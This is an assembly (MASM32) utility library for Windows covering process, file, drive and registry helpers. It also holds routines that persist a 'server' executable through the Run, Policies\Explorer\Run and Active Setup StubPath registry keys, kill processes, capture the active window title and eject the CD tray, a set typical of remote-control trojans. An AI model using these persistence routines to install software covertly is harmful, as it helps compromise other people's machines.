;----------------------------------------------------------------------------------------
; MASM32 System Library
;
; Copyright 2009 Veria Kalantary
; veria.kalantary@gmail.com
; https://github.com/veriak
;
;----------------------------------------------------------------------------------------

include \masm32\include\winmm.inc
include \masm32\include\psapi.inc

includelib \masm32\lib\winmm.lib
includelib \masm32\lib\psapi.lib

VersionInfo struct
    dwOSVersionInfoSize 			dd	?
    dwMajorVersion 					dd	?   
    dwMinorVersion 					dd	?
    dwBuildNumber 					dd	?
    dwPlatformId 					dd	?
    szCSDVersion 					db 128 dup(?)  
VersionInfo ends

ProcessInfo struct
	dwProcessID						dd	?
	dwThreadsCount					dd	?	
	dwParentProcessID				dd	?
	pszExeFile						LPCSTR	?						
ProcessInfo ends
PProcessInfo						typedef ptr ProcessInfo
PProcessesInfo						typedef DWORD

ProcessesInfoList struct
	dwProcessCount					dd	?
	pProcessesInfo					PProcessesInfo	?			
ProcessesInfoList ends
PProcessesInfoList					typedef ptr ProcessesInfoList

DrivesList struct
	dwDrivesCount					dd	?
	pDrivesName						dd	?
DrivesList ends
PDrivesList							typedef ptr	DrivesList

FileInfo struct
	pszName							LPCSTR	?
    dwFileAttributes				dd	?
    dwFileSizeHigh					dd	?
    dwFileSizeLow					dd	?
    stCreationTime					SYSTEMTIME	<>
    stLastAccessTime				SYSTEMTIME	<>
    stLastWriteTime					SYSTEMTIME	<>
FileInfo ends
PFileInfo							typedef ptr	FileInfo
PFilesInfo							typedef ptr DWORD

FilesInfoList struct
	dwFilesCount					dd	?
	pFilesInfo						PFilesInfo	?
FilesInfoList ends
PFilesInfoList						typedef ptr	FilesInfoList

PROCESS_MEMORY_COUNTERS struct
	cb								dd	?
	PageFaultCount					dd	?
	PeakWorkingSetSize				dd	?
	WorkingSetSize					dd	?
	QuotaPeakPagedPoolUsage			dd	?
	QuotaPagedPoolUsage				dd	?
	QuotaPeakNonPagedPoolUsage		dd	?
	QuotaNonPagedPoolUsage			dd	?
	PagefileUsage					dd	?
	PeakPagefileUsage				dd	?
PROCESS_MEMORY_COUNTERS ends

PFILETIME							typedef ptr	FILETIME
PSYSTEMTIME							typedef ptr SYSTEMTIME

AddToStartUp	 					PROTO	:LPCSTR, :LPCSTR, :LPCSTR
AddToStartUpRunMethod				PROTO	:LPCSTR, :LPCSTR
AddToStartUpPolicyMethod			PROTO	:LPCSTR, :LPCSTR
AddToStartUpActiveXMethod			PROTO	:LPCSTR, :LPCSTR
GetOSVersion 						PROTO	:DWORD
GetActiveCaption					PROTO
CloseProcess 						PROTO	:LPCSTR	
CloseProcessById					PROTO	:DWORD
GetProcessList						PROTO	:PProcessesInfoList
GetProcessName 						PROTO	:HANDLE, :DWORD	
GetProcessID 						PROTO	:LPCSTR
OpenCDRom							PROTO
CloseCDRom							PROTO
ShowDesktopMessage 					PROTO 	:LPCSTR, :DWORD, :DWORD
NotepadAsAMessageBoard 				PROTO	:LPCSTR, :LPCSTR
GetDrivesList 						PROTO 	:PDrivesList
GetDirectoryFilesList 				PROTO 	:LPCSTR, :PFilesInfoList
SetRegValue 						PROTO 	:HKEY, :LPCSTR, :LPCSTR, :DWORD, :DWORD
GetRegValue 						PROTO 	:HKEY, :LPCSTR, :LPCSTR, :DWORD, :DWORD
DeleteRegValue 						PROTO	:HKEY, :LPCSTR, :LPCSTR

.data	
	szPlatform98 					db 	"98", 0
	szPlatformXP 					db 	"XP", 0
	szPlatform2000NT 				db 	"2000/NT", 0
	szPlatformNT 					db 	"NT", 0		
	szMCIOpenCDRom					db 	"set cdaudio door open",0
	szMCICloseCDRom					db 	"set cdaudio door closed",0
	szRegSubKeyStartupRun 			db 	"Software\Microsoft\Windows\CurrentVersion\Run", 0
	szRegSubKeyStartupRunServices	db 	"Software\Microsoft\Windows\CurrentVersion\RunServices", 0
	szRegSubKeyStartupPolicy		db 	"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run", 0
	szRegSubKeyStartupActiveX		db 	"Software\Microsoft\Active Setup\Installed Components\", 0	
	szStubPath						db	"StubPath", 0
	szNotepad						db	"notepad", 0	
	szStar        					db 	"*.*", 0 			
	szDir							db	"d:", 0
	szFile							db	"f:", 0
				
.code

AddToStartUp proc lpRegSubKey:LPCSTR, lpRegValue:LPCSTR, lpServerFilePath:LPCSTR
	LOCAL hReg: DWORD
	
	invoke RegCreateKeyEx, HKEY_LOCAL_MACHINE, lpRegSubKey, NULL, NULL,\
                             REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, addr hReg, NULL	                               	    	
   	invoke lstrlen, lpServerFilePath 
   	invoke RegSetValueEx, hReg, lpRegValue, NULL, REG_SZ, lpServerFilePath, eax
   	invoke RegCloseKey, hReg
	ret
AddToStartUp endp

AddToStartUpRunMethod proc lpRegValue:LPCSTR, lpServerFilePath:LPCSTR
	invoke AddToStartUp, addr szRegSubKeyStartupRun, lpRegValue, lpServerFilePath
	ret
AddToStartUpRunMethod endp

AddToStartUpPolicyMethod proc lpRegValue:LPCSTR, lpServerFilePath:LPCSTR
	invoke AddToStartUp, addr szRegSubKeyStartupPolicy, lpRegValue, lpServerFilePath
	ret
AddToStartUpPolicyMethod endp

AddToStartUpActiveXMethod proc lpRegGUID:LPCSTR, lpServerFilePath:LPCSTR
	LOCAL tempbuff[128]: BYTE
	
	invoke lstrcpy, addr tempbuff, addr szRegSubKeyStartupActiveX
	invoke lstrcat, addr tempbuff, lpRegGUID	 
	invoke AddToStartUp, addr tempbuff, addr szStubPath, lpServerFilePath
	ret
AddToStartUpActiveXMethod endp

GetOSVersion proc lpPlatformType:DWORD
    LOCAL VerInfo: VersionInfo
     
    mov VerInfo.dwOSVersionInfoSize, sizeof VersionInfo 
    invoke GetVersionEx, addr VerInfo
    .if VerInfo.dwPlatformId == VER_PLATFORM_WIN32_WINDOWS
        invoke lstrcpy, lpPlatformType, addr szPlatform98
        
    .elseif VerInfo.dwPlatformId == VER_PLATFORM_WIN32_NT
        .if VerInfo.dwMajorVersion == 5
            invoke lstrcpy, lpPlatformType, addr szPlatform2000NT 
        .else 
            invoke lstrcpy, lpPlatformType, addr szPlatformNT
        .endif
        .if VerInfo.dwBuildNumber >= 2500
            invoke lstrcpy, lpPlatformType, addr szPlatformXP
        .endif
    .endif 
    xor eax, eax
    ret    
GetOSVersion endp
   
GetActiveCaption proc
    LOCAL hWnd: HWND
    LOCAL dwLen: DWORD
    
    invoke GetForegroundWindow
    mov hWnd, eax
    invoke GetWindowTextLength, eax
    inc eax
    mov dwLen, eax
    invoke GlobalAlloc, GPTR, dwLen    
    push eax
    invoke GetWindowText, hWnd, eax, dwLen 
    pop eax    
    ret
GetActiveCaption endp

CloseProcess proc lpProcessName:LPCSTR
	LOCAL SnapShot: DWORD
	LOCAL ProcessEntry: PROCESSENTRY32
			
	invoke CreateToolhelp32Snapshot, TH32CS_SNAPALL, 0
	mov SnapShot, eax
	mov ProcessEntry.dwSize, sizeof PROCESSENTRY32
	invoke Process32First, SnapShot, addr ProcessEntry		
@@:								 
	invoke lstrcmpi, lpProcessName, addr ProcessEntry.szExeFile
	or eax, eax
	jne @@Next	
	invoke OpenProcess, PROCESS_ALL_ACCESS, 0, ProcessEntry.th32ProcessID
	invoke TerminateProcess, eax, 0
	cmp eax, 0
	jne @@RetOK			
@@Next:  				
	invoke Process32Next, SnapShot, addr ProcessEntry
	cmp eax, FALSE
	jne @B
	invoke CloseHandle, SnapShot	
	mov eax, FALSE
	ret									
@@RetOK:
	invoke CloseHandle, SnapShot
	mov eax, TRUE
	ret
CloseProcess endp 

CloseProcessById proc dwPID:DWORD
	LOCAL SnapShot: DWORD
	LOCAL ProcessEntry: PROCESSENTRY32
				
	invoke CreateToolhelp32Snapshot, TH32CS_SNAPALL, 0
	mov SnapShot, eax
	mov ProcessEntry.dwSize, sizeof PROCESSENTRY32
	invoke Process32First, SnapShot, addr ProcessEntry		
@@:	
	mov eax, ProcessEntry.th32ProcessID							 
	cmp dwPID, eax 
	jne @@Next	
	invoke OpenProcess, PROCESS_ALL_ACCESS, 0, eax
	invoke TerminateProcess, eax, 0
	cmp eax, 0
	jne @@RetOK			
@@Next:  				
	invoke Process32Next, SnapShot, addr ProcessEntry
	cmp eax, FALSE
	jne @B
	invoke CloseHandle, SnapShot	
	mov eax, FALSE
	ret									
@@RetOK:
	invoke CloseHandle, SnapShot
	mov eax, TRUE
	ret
CloseProcessById endp

GetProcessList proc uses ebx ecx edx lpProcessesInfoList:PProcessesInfoList	
	LOCAL SnapShot: DWORD
	LOCAL ProcessEntry: PROCESSENTRY32	
	LOCAL ppBuff: DWORD
	 		
	invoke CreateToolhelp32Snapshot, TH32CS_SNAPALL, 0
	mov SnapShot, eax
	assume edx: ptr ProcessesInfoList
	assume ebx: ptr ProcessInfo	
	mov edx, lpProcessesInfoList	 
	mov [edx].dwProcessCount, 0
	mov [edx].pProcessesInfo, NULL
	lea eax, [edx].pProcessesInfo
	mov ppBuff, eax			
	mov ProcessEntry.dwSize, sizeof PROCESSENTRY32	
	invoke Process32First, SnapShot, addr ProcessEntry
@@:	
	mov edx, lpProcessesInfoList
	inc [edx].dwProcessCount
	invoke SetLength, ppBuff, sizeof ProcessInfo, [edx].dwProcessCount	 
	mov ebx, ppBuff
	mov ebx, dword ptr [ebx]
	mov ecx, sizeof ProcessInfo
	mov eax, [edx].dwProcessCount
	dec eax
	mul ecx
	add ebx, eax
	m2m [ebx].dwProcessID, ProcessEntry.th32ProcessID
	m2m [ebx].dwThreadsCount, ProcessEntry.cntThreads
	m2m [ebx].dwParentProcessID, ProcessEntry.th32ParentProcessID
	invoke lstrlen, addr ProcessEntry.szExeFile	
	inc eax
	invoke GlobalAlloc, GPTR, eax
	mov [ebx].pszExeFile, eax
	invoke lstrcpy, [ebx].pszExeFile, addr ProcessEntry.szExeFile
	invoke Process32Next, SnapShot, addr ProcessEntry
	cmp eax, FALSE
	jne @B
	invoke CloseHandle, SnapShot
	assume edx: nothing
	assume ebx: nothing	 		
	ret
GetProcessList endp				

GetProcessName proc hSnapShot:HANDLE, dwPID:DWORD
	LOCAL ProcessEntry: PROCESSENTRY32
	LOCAL pProcessName: DWORD
	
	mov pProcessName, NULL
	mov ProcessEntry.dwSize, sizeof PROCESSENTRY32
	invoke Process32First, hSnapShot, addr ProcessEntry	
    .if eax        
		.while TRUE			
			mov eax, ProcessEntry.th32ProcessID
        	.if eax == dwPID
        		invoke lstrlen, addr ProcessEntry.szExeFile
        		inc eax
        		invoke GlobalAlloc, GPTR, eax
        		mov pProcessName, eax        		  
        		invoke lstrcpy, pProcessName, addr ProcessEntry.szExeFile                 
            	.break	
            .endif   
         	invoke Process32Next, hSnapShot, addr ProcessEntry
         	.if eax == 0         		
         		.break
         	.endif
    	.endw	
    .endif 
    mov eax, pProcessName    
	ret
GetProcessName endp

GetProcessID proc lpszProcessName:LPCSTR
	LOCAL hSnapShot: HANDLE
	LOCAL ProcessEntry: PROCESSENTRY32
		
	invoke CreateToolhelp32Snapshot, TH32CS_SNAPPROCESS, 0
	mov hSnapShot, eax
	mov ProcessEntry.dwSize, sizeof PROCESSENTRY32
	invoke Process32First, hSnapShot, addr ProcessEntry	
    .if eax        
		.while TRUE			
			invoke lstrcmpi, addr ProcessEntry.szExeFile, lpszProcessName
        	.if eax == 0
        		mov eax, ProcessEntry.th32ProcessID                  
            	.break	
            .endif   
         	invoke Process32Next, hSnapShot, addr ProcessEntry
         	.if eax == 0 
         		mov eax, -1        		
         		.break
         	.endif
    	.endw	
    .endif 
    invoke CloseHandle, hSnapShot    
	ret
GetProcessID endp

OpenCDRom proc
	invoke mciSendString, addr szMCIOpenCDRom, 0, 0, 0
	ret
OpenCDRom endp

CloseCDRom proc
	invoke mciSendString, addr szMCICloseCDRom, 0, 0, 0
	ret
CloseCDRom endp

ShowDesktopMessage proc uses ecx edx edi lpMsg:LPCSTR, xPos:DWORD, yPos:DWORD
	LOCAL deskdc: HDC
    LOCAL font: LOGFONT
    
	invoke GetDC, 0
	mov deskdc, eax
	invoke SystemParametersInfo, SPI_GETICONTITLELOGFONT, sizeof font, addr font, 0
	lea edi, font
	mov edx, 42   
	mov [edi], edx
	invoke CreateFontIndirect, addr font
	invoke SelectObject, deskdc, eax
	invoke lstrlen, lpMsg         
	mov ecx, eax
	mov eax, lpMsg	
	invoke TextOut, deskdc, xPos, yPos, eax, ecx
	invoke ReleaseDC, 0, deskdc
	ret	
ShowDesktopMessage endp

NotepadAsAMessageBoard proc uses ebx ecx edx lpszTitle:LPCSTR, lpszMessage:LPCSTR		
    LOCAL hNotepad: HANDLE
    LOCAL hEdit: HANDLE
            
    invoke FindWindow, addr szNotepad, 0
    .if eax == 0
    	invoke ShellExecute, 0, StrM("open"), addr szNotepad, 0, 0, SW_SHOWDEFAULT
    	invoke Sleep, 1000		
	.endif	 
	invoke FindWindow, addr szNotepad, 0
	mov hNotepad, eax 
	invoke SendMessage, hNotepad, WM_SETTEXT, 0, lpszTitle 	  		
    invoke FindWindowEx, hNotepad, 0, StrM("Edit"), 0
    mov hEdit, eax    	  				                   	  		    	
    mov ebx, lpszMessage   	
    .if ebx   		        	
	@@:
   		invoke PostMessage, hEdit, WM_CHAR, byte ptr [ebx], 0
  		inc ebx           	
   		cmp byte ptr [ebx], 0h            	
   		jne @B
   		invoke PostMessage, hEdit, WM_CHAR, 13, 0
   	.endif	            	            	
	ret
NotepadAsAMessageBoard endp

FileTimeToDateTime proc lpFileTime:PFILETIME, lpSystemTime:PSYSTEMTIME
	LOCAL LocalFileTime: FILETIME
	  
	invoke FileTimeToLocalFileTime, lpFileTime, addr LocalFileTime
	invoke FileTimeToSystemTime, addr LocalFileTime, lpSystemTime  
	ret
FileTimeToDateTime endp

DateTimeToFileTime proc lpSystemTime:PSYSTEMTIME, lpFileTime:PFILETIME
	LOCAL LocalFileTime: FILETIME
	 
	mov eax, lpFileTime
	mov (FILETIME ptr [eax]).dwLowDateTime, 0
	mov (FILETIME ptr [eax]).dwHighDateTime, 0	
	invoke SystemTimeToFileTime, lpSystemTime, addr LocalFileTime
	invoke LocalFileTimeToFileTime, addr LocalFileTime, lpFileTime
	ret
DateTimeToFileTime endp

GetDrivesList proc uses ebx ecx edx lpDrivesList:PDrivesList
	LOCAL ppDrivesName: DWORD
	LOCAL pBuff: DWORD	
  	LOCAL pStart: DWORD
  	LOCAL dwLen: DWORD
  	  	
  	invoke GetLogicalDriveStrings, 1, NULL
  	.if eax 
  		push eax
  		mov pBuff, 0
  		invoke SetLength, addr pBuff, 1, eax
  		pop eax
  		invoke GetLogicalDriveStrings, eax, pBuff
  		assume edx:ptr DrivesList  	
  		mov edx, lpDrivesList
  		mov [edx].dwDrivesCount, 0
  		mov [edx].pDrivesName, NULL	
  		lea eax, [edx].pDrivesName
  		mov ppDrivesName, eax
    	m2m pStart, pBuff
    	.while TRUE
    		invoke lstrlen, pStart
    		cmp eax, 0
    		je @F
    		mov edx, lpDrivesList    		
    		inc eax
      		mov dwLen, eax
      		inc [edx].dwDrivesCount      		 
      		invoke SetLength, ppDrivesName, sizeof dword, [edx].dwDrivesCount
      		mov ebx, ppDrivesName
			mov ebx, dword ptr [ebx]
			mov ecx, sizeof dword
			mov eax, [edx].dwDrivesCount
			dec eax
			mul ecx
			add ebx, eax
			m2m [ebx], pStart
			mov eax, dwLen
      		add pStart, eax
    	.endw
    	assume edx: nothing
    @@:		
    	mov eax, TRUE  	
  	.else
    	mov eax, FALSE
    .endif
    ret	
GetDrivesList endp

GetDirectoryFilesList proc uses ebx ecx edx lpszDirPath:LPCSTR, lpFilesList:PFilesInfoList
	LOCAL wfd: WIN32_FIND_DATA		
  	LOCAL hSearch: HANDLE
  	LOCAL ppBuff: DWORD
  	LOCAL dwFilesCount: DWORD  	
  	LOCAL temp[512]: BYTE
  	 
  	invoke lstrcpy, addr temp, lpszDirPath
  	invoke lstrcat, addr temp, addr szStar
	invoke FindFirstFile, addr temp, addr wfd
  	mov hSearch, eax
  	.if eax != INVALID_HANDLE_VALUE 
  		assume edx:ptr FilesInfoList
  		assume ebx:ptr FileInfo 
  		mov edx, lpFilesList  		   
    	m2m dwFilesCount, [edx].dwFilesCount
    	lea eax, [edx].pFilesInfo
    	mov ppBuff, eax
    	.while TRUE
    		mov edx, lpFilesList
      		inc [edx].dwFilesCount
      		invoke SetLength, ppBuff, sizeof FileInfo, [edx].dwFilesCount
		    mov ebx, ppBuff
			mov ebx, dword ptr [ebx]
			mov ecx, sizeof FileInfo
			mov eax, [edx].dwFilesCount
			dec eax
			mul ecx
			add ebx, eax
      		invoke lstrlen, addr wfd.cFileName	
			inc eax
			invoke GlobalAlloc, GPTR, eax
			mov [ebx].pszName, eax
			invoke lstrcpy, [ebx].pszName, addr wfd.cFileName
			m2m [ebx].dwFileAttributes, wfd.dwFileAttributes
          	m2m [ebx].dwFileSizeHigh, wfd.nFileSizeHigh
          	m2m [ebx].dwFileSizeLow, wfd.nFileSizeLow 
        	invoke FileTimeToDateTime, addr wfd.ftCreationTime, addr [ebx].stCreationTime
        	invoke FileTimeToDateTime, addr wfd.ftLastAccessTime, addr [ebx].stLastAccessTime
        	invoke FileTimeToDateTime, addr wfd.ftLastWriteTime, addr [ebx].stLastWriteTime
        	invoke FindNextFile, hSearch, addr wfd
        	.if !eax
        		.break
        	.endif
        	assume edx:nothing
        	assume ebx:nothing
    	.endw
    	invoke FindClose, hSearch
    	mov eax, TRUE  
  	.else
    	mov eax, FALSE
    .endif	
    ret
GetDirectoryFilesList endp

SetRegValue proc uses ecx edx hKey:HKEY, lpszRegKey:LPCSTR, lpszValue:LPCSTR, dwValueType:DWORD, lpData:DWORD
	LOCAL hReg: HANDLE	
	LOCAL dwDisposition: DWORD
	
	invoke RegOpenKeyEx, hKey, lpszRegKey, 0, KEY_ALL_ACCESS, addr hReg
	.if eax != ERROR_SUCCESS
		mov dwDisposition, REG_CREATED_NEW_KEY
		invoke RegCreateKeyEx, hKey, lpszRegKey, 0, 0, REG_OPTION_NON_VOLATILE,\
					KEY_ALL_ACCESS, 0, addr hReg, addr dwDisposition
	.endif							
	.if eax == ERROR_SUCCESS
		mov eax, dwValueType
		.if eax == REG_SZ										
			invoke lstrlen, lpData
			invoke RegSetValueEx, hReg, lpszValue, 0, REG_SZ, lpData, eax
		.elseif eax == REG_DWORD
			invoke RegSetValueEx, hReg, lpszValue, 0, eax, lpData, sizeof dword
		.else
			mov eax, 1	
		.endif	
		push eax
		invoke RegCloseKey, hReg
		pop eax
		.if eax == ERROR_SUCCESS
			mov eax, TRUE
		.else
			mov eax, FALSE
		.endif
	.else
		mov eax, FALSE			
	.endif		
	ret
SetRegValue endp

GetRegValue proc uses ebx ecx edx hKey:HKEY, lpszRegKey:LPCSTR, lpszValue:LPCSTR, dwValueType:DWORD,\
		lpData:DWORD
	LOCAL hReg: HANDLE
	LOCAL RegValueBuff[128]: BYTE
	LOCAL RegDataBuff[128]: BYTE 
	LOCAL dwValueSize: DWORD
    LOCAL dwDataSize: DWORD
    LOCAL dwType: DWORD
    LOCAL dwi: DWORD
            
	invoke RegOpenKeyEx, hKey, lpszRegKey, 0, KEY_ALL_ACCESS, addr hReg
	.if eax == ERROR_SUCCESS
		mov dwi, 0 
		mov dwValueSize, sizeof RegValueBuff
		mov dwDataSize, sizeof RegDataBuff		    		    			   		    		
		invoke RegEnumValue, hReg, dwi, addr RegValueBuff, addr dwValueSize, 0, addr dwType,\
								addr RegDataBuff, addr dwDataSize
		.while eax != ERROR_NO_MORE_ITEMS 			   	
	    	invoke lstrcmp, addr RegValueBuff, lpszValue
	    	.if eax == 0
	    		mov eax, dwType
	    		.if eax == dwValueType
	    			.if eax == REG_SZ   	    		
	    				invoke lstrcpy, lpData, addr RegDataBuff
	    				
	    			.elseif eax == REG_DWORD
	    				lea ebx, RegDataBuff
	    				mov eax, lpData
	    				m2m dword ptr [eax], dword ptr [ebx] 
	    			.endif		    		
	    			jmp @F
	    		.endif	
	    	.endif 	   	    		
			inc dwi
			mov dwValueSize, sizeof RegValueBuff
			mov dwDataSize, sizeof RegDataBuff 	
			invoke memset, addr RegValueBuff, 0, dwValueSize
			invoke memset, addr RegDataBuff, 0, dwDataSize 	    		    						    		
			invoke RegEnumValue, hReg, dwi, addr RegValueBuff, addr dwValueSize, 0, addr dwType,\
								addr RegDataBuff, addr dwDataSize    		       	    
		.endw
		invoke RegCloseKey, hReg
		mov eax, FALSE
		ret	
	@@:	
		invoke RegCloseKey, hReg
		mov eax, TRUE
		ret									
	.endif	
	mov eax, FALSE 				                 
	ret
GetRegValue endp

DeleteRegValue proc uses ecx edx hKey:HKEY, lpszRegKey:LPCSTR, lpszValue:DWORD
	LOCAL hReg: HANDLE
	
	invoke RegOpenKeyEx, hKey, lpszRegKey, 0, KEY_ALL_ACCESS, addr hReg
	.if eax == ERROR_SUCCESS												
		invoke RegDeleteValue, hReg, lpszValue
		push eax  
		invoke RegCloseKey, hReg
		pop eax
		.if eax == ERROR_SUCCESS
			mov eax, TRUE
		.else
			mov eax, FALSE
		.endif	
	.endif		
	ret
DeleteRegValue endp